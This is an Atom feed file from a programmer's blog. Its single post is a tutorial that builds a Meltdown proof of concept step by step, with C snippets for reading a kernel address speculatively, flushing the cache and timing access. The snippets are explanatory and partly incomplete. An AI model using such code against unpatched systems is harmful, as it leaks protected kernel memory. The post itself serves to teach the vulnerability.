@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | a programmer having fun with bits]]></title>
+  <link href="http://funwithbits.net/blog/categories/security/atom.xml" rel="self"/>
+  <link href="http://funwithbits.net/"/>
+  <updated>2020-07-16T13:05:24-03:00</updated>
+  <id>http://funwithbits.net/</id>
+  <author>
+    <name><![CDATA[Raphael S. Carvalho (a.k.a. utroz)]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Programmer's Guide to Meltdown]]></title>
+    <link href="http://funwithbits.net/blog/programmers-guide-to-meltdown/"/>
+    <updated>2018-01-09T23:57:48-02:00</updated>
+    <id>http://funwithbits.net/blog/programmers-guide-to-meltdown</id>
+    <content type="html"><![CDATA[<p>Ok, what I want here is to guide you through a Meltdown proof-of-concept that
+peeks into kernel data that cpu is supposed to protect. Unfortunately, that
+promise was broken and virtually all intel x86 cpu hosts are vulnerable until
+patched (Linux patchset is available and named <a href="https://lkml.org/lkml/2017/10/31/884">kpti (kernel page table isolation)</a>).</p>
+
+<p>So far, we thought we were protected by cpu mechanisms because when you try
+to load kernel (sensitive) data, cpu triggers an exception which in turn is
+propagated by kernel to application as SIGSEGV, leading to application
+termination, look at this example:
+<code>bash
+$ cat /proc/kallsyms | grep banner
+ffffffff81a00060 R linux_proc_banner
+$ cat kernel_address_read.cc
+main() {
+    char *p = (char*)0xffffffff81a00060; // use address of a kernel symbol containing banner
+    *p = 0;
+}
+$ ./kernel_address_read
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+</code></p>
+
+<p>So time went by, and we all thought we were safe. Recently it was figured out
+that speculative execution could be exploited to break that promise.
+It basically consists of making the cpu use the value stored in a kernel
+address before the cpu detects the access to kernel data is an invalid
+instruction, but it&rsquo;s not that simple&hellip; look at this example:</p>
+
+<pre><code class="c">char *kernel_address = (char*)0xffffffff81a00060;
+char kernel_data = *kernel_address;
+int number = 10;
+char byte = kernel_data + number;
+</code></pre>
+
+<p>It turns out that cpu may actually perform the addition of value found in kernel
+address and 10, but the result is definitely not returned to the program which
+again terminates with a SIGSEGV.</p>
+
+<p>Now comes the BINGO, EUREKA! moment: A researcher figured out that whichever
+data (in example above kernel_data and byte) used in the instruction
+that procedes the invalid one (*kernel_address) will remain cached in the
+cpu data cache. Yes! CPU doesn&rsquo;t invalidate data cached from an instruction
+which used the result (kernel data) of an invalid one (access to kernel data).</p>
+
+<p>Well, data cache cannot directly be read. But we know that access to data
+cached is much faster than to uncached ones, so what we can do is to use the
+byte read from kernel as an index for an array of size 256 elements, each index
+representing a possible representation of a byte (0..255). For example:</p>
+
+<pre><code class="c">char *kernel_address = (char*)0xffffffff81a00060;
+char array[256];
+
+char kernel_data_as_index = *kernel_address;
+char byte = array[kernel_data_as_index];
+</code></pre>
+
+<p>That would only work if cache line size is 1, but it&rsquo;s usually 64 for level 1,
+so we need to multiply array size and index by 64.</p>
+
+<pre><code class="c">const int cache_line_size = 64;
+char *kernel_address = (char*)0xffffffff81a00060;
+char array[256 * cache_line_size];
+
+char kernel_data_as_index = *kernel_address;
+char byte = array[kernel_data_as_index * cache_line_size];
+</code></pre>
+
+<p>So if it happens that the instruction that accesses array using byte read from
+kernel is executed before cpu triggers exception for invalid access to kernel,
+it means cpu will bring array[kernel_data_as_index * cache_line_size] to cache.</p>
+
+<p>Now we know that we can iterate through the 256 &ldquo;cache lines&rdquo; in array, and
+we&rsquo;ll know that the one with the fastest access time is the one cached by cpu,
+and the &ldquo;cache line&rdquo; index is actually the byte read from kernel.</p>
+
+<p>For example:</p>
+
+<pre><code class="c">const int cache_line_size = 64;
+char *kernel_address = (char*)0xffffffff81a00060;
+char array[256 * cache_line_size];
+
+char kernel_data_as_index = *kernel_address;
+char byte = array[kernel_data_as_index * cache_line_size];
+
+// Please consider for now that signal handler for sigsegv was set up,
+// and we continue executing from here after invalid access
+
+int fastest_i_time = MAX_INTEGER_VALUE;
+int fastest_i = 0;
+
+for (int i = 0; i &lt; 256; i++) {
+    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
+    int time = access_time_to(array[i * cache_line_size]);
+    if (time &lt; fastest_i_time) {
+        fastest_i_time = time;
+        fastest_i = i;
+    }
+}
+
+printf("byte read from kernel is: %d\n", fastest_i);
+</code></pre>
+
+<p>It&rsquo;s not hard to understand it. If you think of it, fastest_i is equal to the
+byte stored in kernel_address because program determined array[fastest_i *
+cache_line_size] is cached by cpu and only one place in array was cached
+previously by the instructions that accessed kernel and used its value to
+retrieve a byte from array.</p>
+
+<p>In real life, it&rsquo;s not that simple to implement because you need to clear data
+cache (clflush instruction can be used) before performing the test because you
+want to read more bytes and the data cache shouldn&rsquo;t be polluted for array or
+wrong result is returned.</p>
+
+<p>This is my assembly inline to clear cache line for a specific address:
+<code>c
+__attribute__((always_inline))
+inline void __clflush(const char *address)
+{
+    asm __volatile__ (
+        "mfence         \n"
+        "clflush 0(%0)  \n"
+        :
+        : "r" (address)
+        :            );
+}
+</code></p>
+
+<p>So you&rsquo;ll need to do that for each &ldquo;cache line&rdquo; in the array, the code now
+becomes this:</p>
+
+<pre><code class="c">const int cache_line_size = 64;
+char *kernel_address = (char*)0xffffffff81a00060;
+char array[256 * cache_line_size];
+
+for (int i = 0; i &lt; 256; i++) {
+    __clflush(array[i * cache_line_size]);
+}
+
+char kernel_data_as_index = *kernel_address;
+char byte = array[kernel_data_as_index * cache_line_size];
+
+int fastest_i_time = MAX_INTEGER_VALUE;
+int fastest_i = 0;
+
+for (int i = 0; i &lt; 256; i++) {
+    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
+    int time = access_time_to(array[i * cache_line_size]);
+    if (time &lt; fastest_i_time) {
+        fastest_i_time = time;
+        fastest_i = i;
+    }
+}
+
+printf("byte read from kernel is: %d\n", fastest_i);
+</code></pre>
+
+<p>That&rsquo;s not complete code because you&rsquo;ll have to set up signal handler or use
+TSX (Transactional Synchronization Extensions) to mitigate SIGSEGV that occurs
+after the instruction to load kernel address retires (is fully executed).
+Follow example using TSX:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="n">cache_line_size</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">kernel_address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="mh">0xffffffff81a00060</span><span class="p">;</span>
+</span><span class='line'><span class="kt">char</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">__clflush</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">xbegin</span><span class="p">()</span> <span class="o">==</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">XBEGIN_STARTED</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">kernel_data_as_index</span> <span class="o">=</span> <span class="o">*</span><span class="n">kernel_address</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">kernel_data_as_index</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">_xend</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// do nothing</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">MAX_INTEGER_VALUE</span><span class="p">;</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">fastest_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">time</span> <span class="o">=</span> <span class="n">access_time_to</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="n">cache_line_size</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">time</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">fastest_i_time</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">fastest_i_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">fastest_i</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">byte</span> <span class="n">read</span> <span class="n">from</span> <span class="n">kernel</span> <span class="nl">is</span><span class="p">:</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">fastest_i</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>There&rsquo;s nothing much you can do with this code that only reads 1 byte from
+kernel space, so I&rsquo;d suggest you to take a look at the code of my own project
+that exploits meltdown to check whether or not system is affected, follow link:
+<a href="https://github.com/raphaelsc/Am-I-affected-by-Meltdown">https://github.com/raphaelsc/Am-I-affected-by-Meltdown</a>
+I&rsquo;d also recommend you to take a look at proof-of-concept of the researchers
+involved: <a href="https://github.com/IAIK/meltdown/">https://github.com/IAIK/meltdown/</a></p>
+
+<p>Cheers!</p>
+]]></content>
+  </entry>
+  
+</feed>
